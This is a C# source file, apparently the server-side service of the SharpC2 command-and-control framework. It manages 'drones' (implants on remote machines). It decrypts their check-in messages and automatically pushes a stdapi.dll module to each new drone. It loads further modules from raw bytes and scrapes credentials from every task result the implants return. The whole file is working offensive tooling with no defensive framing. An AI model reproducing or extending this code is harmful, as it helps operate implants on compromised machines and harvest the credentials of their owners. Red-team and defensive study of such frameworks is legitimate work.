using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using AutoMapper;
using Microsoft.AspNetCore.SignalR;
using SharpC2.API.V1.Responses;
using TeamServer.Hubs;
using TeamServer.Interfaces;
using TeamServer.Models;

using Module = TeamServer.Modules.Module;

namespace TeamServer.Services
{
    public class ServerService : IServerService
    {
        private C2Profile _profile; 

        private readonly IDroneService _drones;
        private readonly ICryptoService _crypto;
        private readonly ICredentialService _credentials;
        private readonly IMapper _mapper;
        private readonly IHubContext<MessageHub, IMessageHub> _hub;
        
        private readonly List<Module> _modules = new();

        public ServerService(IDroneService drones, ICredentialService credentials, IHubContext<MessageHub, IMessageHub> hub, ICryptoService crypto, IMapper mapper)
        {
            _drones = drones;
            _crypto = crypto;
            _mapper = mapper;
            _credentials = credentials;
            _hub = hub;

            LoadDefaultModules();
        }

        public void SetC2Profile(C2Profile profile)
        {
            _profile = profile;
        }

        public C2Profile GetC2Profile()
        {
            return _profile ?? new C2Profile();
        }

        public Module LoadModule(byte[] bytes)
        {
            var asm = Assembly.Load(bytes);
            
            foreach (var module in LoadModulesFromTypes(asm.GetTypes()))
            {
                RegisterModule(module);
                return module;
            }

            return null;
        }

        public Module GetModule(string name)
        {
            return GetModules().FirstOrDefault(m =>
                m.Name.Equals(name, StringComparison.OrdinalIgnoreCase));
        }

        public IEnumerable<Module> GetModules()
        {
            return _modules;
        }

        public async Task HandleC2Message(MessageEnvelope envelope)
        {
            var message = _crypto.DecryptEnvelope(envelope);
            var drone = _drones.GetDrone(message.Metadata.Guid);

            if (drone is null)
            {
                drone = new Drone(message.Metadata);
                
                // new drone, send stdapi.dll
                drone.TaskDrone(new DroneTask("core", "load-module")
                {
                    Artefact = await Utilities.GetEmbeddedResource("stdapi.dll")
                });
                
                _drones.AddDrone(drone);
            }
            
            drone.CheckIn();
            await _hub.Clients.All.DroneCheckedIn(drone.Metadata);

            switch (message.Type)
            {
                case C2Message.MessageType.DroneModule:
                    var module = message.Data.Deserialize<DroneModule>();
                    await HandleRegisterDroneModule(message.Metadata, module);
                    break;

                case C2Message.MessageType.DroneTaskUpdate:
                    var update = message.Data.Deserialize<DroneTaskUpdate>();
                    await HandleTaskUpdate(message.Metadata, update);
                    break;
                
                case C2Message.MessageType.NewLink:
                    var parentMetadata = message.Data.Deserialize<DroneMetadata>();
                    drone.Parent = parentMetadata.Guid;
                    break;
                
                default:
                    return;
            }
        }

        private async Task HandleTaskUpdate(DroneMetadata metadata, DroneTaskUpdate update)
        {
            var module = _modules.FirstOrDefault(m =>
                m.Name.Equals(update.ServerModule, StringComparison.OrdinalIgnoreCase));

            if (module is null) return;
            await module.Execute(metadata, update);
            
            if (update.Result?.Length > 0)
                _credentials.ScrapeCredentials(Encoding.UTF8.GetString(update.Result));
        }

        private async Task HandleRegisterDroneModule(DroneMetadata metadata, DroneModule module)
        {
            var drone = _drones.GetDrone(metadata.Guid);
            drone.AddModule(module);

            var response = _mapper.Map<DroneModule, DroneModuleResponse>(module);
            await _hub.Clients.All.DroneModuleLoaded(metadata, response);
        }

        private void LoadDefaultModules()
        {
            var self = Assembly.GetExecutingAssembly();
            
            foreach (var module in LoadModulesFromTypes(self.GetTypes()))
                RegisterModule(module);
        }

        private IEnumerable<Module> LoadModulesFromTypes(IEnumerable<Type> types)
        {
            foreach (var type in types)
            {
                if (!type.IsSubclassOf(typeof(Module))) continue;

                yield return Activator.CreateInstance(type) as Module;
            }
        }

        private void RegisterModule(Module module)
        {
            module.Init(_drones, _hub);
            _modules.Add(module);
        }
    }
}